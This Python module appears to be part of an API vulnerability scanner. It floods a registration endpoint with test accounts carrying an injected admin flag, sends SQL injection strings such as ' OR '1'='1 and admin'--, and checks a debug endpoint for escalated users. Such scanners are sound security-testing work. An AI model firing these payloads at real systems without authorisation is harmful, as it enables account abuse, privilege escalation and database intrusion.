#!/usr/bin/env python3
"""
Registration Vulnerability Scanner
Checks for multiple vulnerabilities in registration endpoints including:
- Mass user creation without rate limiting
- Privilege escalation via admin flag injection
- SQL injection in registration parameters
"""

import requests
import time
from typing import Dict, List, Optional, Any
from datetime import datetime
from .base_scanner import BaseScanner
from RAGScripts.utils.logger import setup_scanner_logger

class RegistrationVulnScanner(BaseScanner):
    def __init__(self):
        super().__init__()
        self.logger = setup_scanner_logger("registration_vuln")
        self.target = None
        
    def scan(self, url: str, method: str, path: str, response: requests.Response, token: Optional[str] = None, 
             headers: Optional[Dict[str, str]] = None, tokens: Optional[Dict[str, List[Dict[str, Any]]]] = None, 
             context: Optional[Dict[str, Any]] = None) -> List[Dict[str, Any]]:
        self.base_url = url
        self.target = url
        
        # Test parameters for rate limiting
        request_count = 50
        interval = 0.01  # 10ms between requests - very fast to test rate limiting
        register_endpoint = "/users/v1/register"
        register_url = f"{url}{register_endpoint}"
        
        # Headers setup
        request_headers = headers or {}
        request_headers['Content-Type'] = 'application/json'
        
        # Track all responses for rate limit analysis
        responses = []
        start_time = time.time()
        
        try:
            # Test rapid user creation
            for i in range(request_count):
                test_payload = {
                    "username": f"test_user_{int(time.time())}_{i}",
                    "password": "test1",
                    "email": f"test_{int(time.time())}_{i}@example.com",
                    "admin": "true"  # Testing privilege escalation
                }
                
                register_resp = requests.post(
                    register_url,
                    json=test_payload,
                    headers=request_headers,
                    timeout=5
                )
                
                responses.append({
                    "status_code": register_resp.status_code,
                    "time": time.time() - start_time,
                    "response": register_resp
                })
                
                if register_resp.status_code == 429:  # Too Many Requests
                    break
                    
                time.sleep(interval)
            
            # Check for successful registrations
            successful_registrations = [r for r in responses if r["status_code"] == 200]
            
            # Test SQL injection
            sql_payloads = [
                {"username": "' OR '1'='1", "password": "test", "email": "test@test.com"},
                {"username": "admin'--", "password": "test", "email": "test@test.com"},
                {"username": "\" OR \"1\"=\"1", "password": "test", "email": "test@test.com"}
            ]
            
            sql_responses = []
            for payload in sql_payloads:
                sql_resp = requests.post(
                    register_url,
                    json=payload,
                    headers=request_headers,
                    timeout=5
                )
                sql_responses.append({
                    "payload": payload,
                    "response": sql_resp
                })
            
            # Check debug endpoint for successful privilege escalation
            debug_resp = requests.get(f"{url}/users/v1/_debug")
            
            # Analyze findings
            findings = []
            
            # Check for rate limiting issues
            if len(successful_registrations) > 10 and (responses[-1]["time"] - responses[0]["time"]) < 5:
                request_data, response_data = self.capture_transaction(
                    successful_registrations[0]["response"],
                    auth_state={"auth_type": "none"},
                    correlation_id=str(time.time())
                )
                
                findings.append({
                    "type": "RATE_LIMIT_REGISTRATION",
                    "severity": "HIGH",
                    "detail": f"Successfully created {len(successful_registrations)} users in {responses[-1]['time'] - responses[0]['time']:.2f} seconds without rate limiting",
                    "evidence": {
                        "successful_registrations": len(successful_registrations),
                        "time_elapsed": responses[-1]["time"] - responses[0]["time"],
                        "request": request_data,
                        "response": response_data
                    }
                })
            
            # Check for privilege escalation
            if debug_resp.status_code == 200:
                users = debug_resp.json().get("users", [])
                admin_users = [u for u in users if u.get("username", "").startswith("test_user_") and u.get("admin") == True]
                
                if admin_users:
                    request_data, response_data = self.capture_transaction(
                        successful_registrations[0]["response"],
                        auth_state={"auth_type": "none"},
                        correlation_id=str(time.time())
                    )
                    
                    findings.append({
                        "type": "PRIVILEGE_ESCALATION_REGISTRATION",
                        "severity": "CRITICAL",
                        "detail": "Successfully created admin users through mass assignment vulnerability",
                        "evidence": {
                            "admin_users_created": len(admin_users),
                            "request": request_data,
                            "response": response_data
                        }
                    })
            
            # Check for SQL injection vulnerabilities
            for sql_test in sql_responses:
                if sql_test["response"].status_code == 500 and "SQL" in sql_test["response"].text:
                    request_data, response_data = self.capture_transaction(
                        sql_test["response"],
                        auth_state={"auth_type": "none"},
                        correlation_id=str(time.time())
                    )
                    
                    findings.append({
                        "type": "SQL_INJECTION_REGISTRATION",
                        "severity": "CRITICAL",
                        "detail": "Registration endpoint vulnerable to SQL injection",
                        "evidence": {
                            "sql_payload": sql_test["payload"],
                            "request": request_data,
                            "response": response_data
                        }
                    })
                    
            return findings
                
        except requests.RequestException as e:
            self.logger.error(f"Error in registration vulnerability check: {str(e)}")
            return []